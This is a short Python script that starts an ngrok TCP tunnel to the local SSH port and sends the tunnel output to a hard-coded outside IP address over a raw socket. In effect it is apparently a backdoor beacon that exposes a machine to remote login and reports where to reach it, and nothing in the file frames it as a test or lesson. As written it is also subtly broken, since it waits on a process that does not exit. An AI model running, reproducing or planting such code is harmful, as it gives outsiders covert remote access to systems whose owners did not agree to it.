import socket
import subprocess
#output = subprocess.check_output(['echo', 'Hello'], shell=True)
output = subprocess.run(['ngrok', 'tcp', '22'], check = False , capture_output = True, shell=True).stdout
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 3389
print("Trying to connect...")
s.connect(('34.95.19.212', port))
print (s.recv(1024).decode())
print(output)
s.sendall(output)
s.close()